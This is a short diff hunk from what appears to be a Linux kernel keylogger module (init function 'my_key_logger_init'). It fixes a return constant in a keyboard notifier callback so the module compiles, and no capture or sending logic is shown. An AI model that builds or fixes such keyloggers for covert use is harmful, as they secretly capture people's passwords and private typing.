@@ -145,7 +145,7 @@ static int key_pressed(struct notifier_block *nb, unsigned long action, void *da
     }
   }
   
-  return NOTIFIER_OK; // everything ok
+  return NOTIFY_OK; // everything ok
 }
 
 module_init(my_key_logger_init);
